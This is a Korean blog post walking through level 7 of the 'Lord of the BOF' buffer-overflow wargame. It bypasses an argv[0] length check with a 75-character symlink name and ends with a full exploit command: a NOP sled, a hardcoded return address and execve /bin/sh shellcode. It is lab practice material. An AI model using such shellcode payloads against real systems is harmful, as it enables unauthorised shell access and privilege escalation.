---
layout: post
title: "The Lord of the BOF - Level 7"
comments: true
categories: [LOB]
tags: [LOB]
---
<img data-action="zoom" src='{{ "assets/lob/level7/1.jpg" | relative_url }}' alt='relative'>  

## 1) darkelf/kernel crashed 입력하여 로그인하기  

<img data-action="zoom" src='{{ "assets/lob/level7/2.png" | relative_url }}' alt='relative'>  

``` c
// here is changed!
if(strlen(argv[0]) != 77){
    printf("argv[0] error\n");
    exit(0);
}
```

이전 코드에서 바뀐 부분을 확인해보니 argv[0]의 길이가 77 byte가 아닌 경우 프로그램이 종료한다고 합니다.  

argv[0]은 실행한 프로그램의 파일명인데 파일명의 길이를 77 byte로 어떻게 늘릴 수 있을까요?  
저는 symbolic link가 생각났습니다.  

## 2) orge 프로그램의 심볼릭 링크 파일 만들기  

``` bash
ln -s orge [file name]
```

심볼릭 링크 파일을 만드는 명령어는 ln 명령어에 -s 옵션을 사용합니다.  
argv[0]의 길이가 77 byte이어야 하기 때문에 이에 맞춰 파일 이름을 정해줍니다.  

<img data-action="zoom" src='{{ "assets/lob/level7/3.png" | relative_url }}' alt='relative'>  

프로그램을 실행할 때 ./name_a 라고 입력하였기 때문에 argv[0]에는 ./name_a라고 저장되어 있습니다.  
77 byte - 2 byte('./') =  75 byte  

심볼릭 링크 파일 명의 길이가 75 byte이면 됩니다.  

``` bash
ln -s orge `python -c 'print "A"*75'`
```

<img data-action="zoom" src='{{ "assets/lob/level7/4.png" | relative_url }}' alt='relative'>  

## 3) 공격 페이로드 입력하여 BOF 일으키기  

우선 쉘코드가 저장될 argv[2]의 위치를 대략적으로 파악하기 위해 orge.c 파일을 컴파일하여 test 프로그램을 생성합니다.  

<img data-action="zoom" src='{{ "assets/lob/level7/5.png" | relative_url }}' alt='relative'>  


test 프로그램을 gdb로 컴파일하니 0xbffff8ec 이 주소를 RET에 입력하면 쉘코드를 실행할 수 있을 것으로 예상됩니다.  

``` bash
./`python -c 'print "A"*75'` `python -c 'print "\x90"*44+"\xec\xf8\xff\xbf"'` `python -c 'print "\x90"*1000+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
```

<img data-action="zoom" src='{{ "assets/lob/level7/5.png" | relative_url }}' alt='relative'>  